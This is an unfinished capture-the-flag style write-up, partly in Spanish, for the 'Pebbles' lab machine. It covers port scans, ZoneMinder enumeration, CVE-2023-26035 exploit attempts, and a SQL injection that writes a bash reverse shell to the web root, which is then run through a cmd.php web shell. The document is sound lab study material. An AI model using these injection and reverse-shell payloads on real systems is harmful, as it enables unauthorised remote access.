#InProgress 
# IP
```
192.168.198.52
```

## Nmap

```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTlsFY1sjAxyC1lqlzeHAaSC0ec76cB5Hoq6aVwMNphXzrhslKqJJ5L0sjOjQem02G6wukOQ/qIVzUZOPxdn4tlN+YuCRqrE7nSIj36hh6JeG4cI9t3qOJUPndLKuKSyJKwV1Dl7gQKcjS0gxO6kWybHMf4CT9a8QsF8mLDPNU3p5VfsEdrgJ+q5hNOmLYJPqwIHTdCweuSwaORn9wQGlmKphGZJlktEKEPwecDZO5KUc6g3N23G+vWv2uCmAw9ov8AQrePxdjz5/QQ8PdY6zedwcLUFjmL5jx9UhZLhDDf/pzP0wiswgm7DZXG6WHwMCbxNo0zX4/HFDswDHc/W+J
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOrgGvGclvZKKtoTk+H0ojQxTTSKljSVFLY8udD6Cb8OQLjgd5F48Em8sa7JjoCa4Mn3USw7EttQLL9a1RNEgio=
|   256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBSm8eCxMlgt56SQ1z3TjY8R0ZY2MMMlYTB4Bby39xXE
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 7EC7ACEA6BB719ECE5FCE0009B57206B
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Tomcat
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

3305/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```

## Nmap UDP


# Enumeration
## FTP
admin:admin creds not working
## HTTP 80
Apache/2.4.18 (Ubuntu) Server at 192.168.198.52 Port 80
http://192.168.198.52/zm/
 ZoneMinder, v1.29.0
 MooTools 1.4.5
### Directories and files
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928100334.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928100348.png?raw=true)
ZoneMinder following exploits not working
https://github.com/heapbytes/CVE-2023-26035
```
python zm-exploit2.py --target http://192.168.198.52:80/zm/index.php --cmd 'ping 192.168.45.250 -c 5'
```
https://github.com/rvizx/CVE-2023-26035
```
python3 zm-exploitmod.py -t http://192.168.198.52:80/zm/ -ip 192.168.45.250 -p 443
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928115050.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928114945.png?raw=true)

## HTTP 8080

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928105538.png?raw=true)

## HTTP 3305
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928114037.png?raw=true)


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928120121.png?raw=true)
Tenemos al usuario sally
Enviamos payload
```
sh -i >& /dev/tcp/192.168.45.250/80 0>&1
```

```
view=request&request=log&task=query&limit=100;select+'sh+-i+>%26+/dev/tcp/192.168.45.250/80+0>%261'+into+outfile+'/var/www/html/revshell3.sh'%3b
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928121702.png?raw=true)
```
http://192.168.198.52:3305/cmd.php?cmd=/bin/bash%20revshell3.sh
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928121715.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240928121728.png?raw=true)

Tenemos revshell!
# PrivEsc

## Manual

Upgrade shell with python
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

No consigo que funcione:
```
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40053.zip
```

mysql exploit visto en un writeup

```
https://sudsy-fireplace-912.notion.site/Pebbles-from-Proving-Grounds-without-SQLMap-by-Luis-Moret-lainkusanagi-23b29df77e6946a6bb8cb213a76a9ac8
```



## Automated

### Peass

Linux version 4.4.0-21-generic
### Mimikatz

